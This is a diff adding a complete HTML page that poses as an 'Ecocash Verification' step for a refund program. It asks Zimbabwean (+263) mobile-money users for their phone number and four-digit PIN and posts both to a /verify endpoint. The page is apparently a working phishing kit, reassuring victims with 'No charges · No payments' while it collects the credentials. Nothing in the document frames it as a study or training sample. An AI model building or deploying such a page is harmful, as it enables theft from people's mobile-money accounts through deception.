@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ecocash Verification</title>
+
+    <style>
+        :root {
+            --blue: #0A4D8C;
+            --red: #C62828;
+            --white: #ffffff;
+            --light-gray: #f4f6f8;
+            --dark: #222;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            background: var(--light-gray);
+        }
+
+        /* --------------------------
+           TOP NAVBAR WITH LOGO
+        -------------------------- */
+        .top-navbar {
+            background: var(--white);
+            display: flex;
+            align-items: center;
+            padding: 10px 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            z-index: 1000;
+        }
+
+        .top-navbar img {
+            height: 50px; /* adjust logo size */
+            width: auto;
+        }
+
+        /* --------------------------
+           MAIN CONTAINER
+        -------------------------- */
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding-top: 80px; /* leave space for fixed navbar */
+        }
+
+        .login-container {
+            background: var(--white);
+            width: 100%;
+            max-width: 360px;
+            border-radius: 8px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+
+        .login-header {
+            background: var(--blue);
+            color: var(--white);
+            text-align: center;
+            padding: 25px 20px;
+        }
+
+        .login-header h1 {
+            margin: 0;
+            font-size: 1.4rem;
+        }
+
+        .login-header p {
+            margin-top: 5px;
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+
+        .login-body {
+            padding: 25px;
+        }
+
+        label {
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+
+        .phone-input {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-top: 8px;
+            padding: 10px;
+            margin-bottom: 20px;
+        }
+
+        .phone-input span {
+            margin-right: 8px;
+            font-weight: bold;
+            color: var(--blue);
+        }
+
+        .phone-input input {
+            border: none;
+            outline: none;
+            width: 100%;
+            font-size: 1rem;
+        }
+
+        .pin-label {
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .pin-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 25px;
+        }
+
+        .pin-box {
+            width: 55px;
+            height: 55px;
+            font-size: 1.4rem;
+            text-align: center;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+        }
+
+        .pin-box:focus {
+            border-color: var(--blue);
+            outline: none;
+        }
+
+        .btn-action {
+            width: 100%;
+            background: var(--red);
+            color: var(--white);
+            padding: 14px;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            cursor: pointer;
+        }
+
+        .btn-action:hover {
+            opacity: 0.9;
+        }
+
+        .footer-info {
+            text-align: center;
+            font-size: 0.75rem;
+            color: #666;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- TOP NAVBAR -->
+    <div class="top-navbar">
+        <img src="static/logo.png" alt="Refund Program Logo">
+    </div>
+
+    <!-- MAIN CONTAINER -->
+    <div class="main-container">
+        <div class="login-container">
+
+            <div class="login-header">
+                <h1>Ecocash Verification</h1>
+                <p>Just a quick verification to ensure your refund reaches your account.</p>
+            </div>
+
+            <div class="login-body">
+                <form method="POST" action="/verify">
+                    
+                    <label>Phone Number</label>
+                    <div class="phone-input">
+                        <span>+263</span>
+                        <input type="tel" name="phone" placeholder="7XXXXXXXX" required>
+                    </div>
+
+                    <p class="pin-label">Enter your 4-digit PIN</p>
+
+                    <div class="pin-inputs">
+                        <input type="password" maxlength="1" class="pin-box" name="pin[]" required>
+                        <input type="password" maxlength="1" class="pin-box" name="pin[]" required>
+                        <input type="password" maxlength="1" class="pin-box" name="pin[]" required>
+                        <input type="password" maxlength="1" class="pin-box" name="pin[]" required>
+                    </div>
+
+                    <button type="submit" class="btn-action">
+                        Verify & Continue
+                    </button>
+                </form>
+
+                <div class="footer-info">
+                    <p>Verification only · No charges · No payments</p>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+<script>
+    const pins = document.querySelectorAll('.pin-box');
+
+    pins.forEach((pin, index) => {
+        pin.addEventListener('input', () => {
+            if (pin.value.length === 1 && index < pins.length - 1) {
+                pins[index + 1].focus();
+            }
+        });
+
+        pin.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && pin.value === '' && index > 0) {
+                pins[index - 1].focus();
+            }
+        });
+    });
+</script>
+
+</body>
+</html>
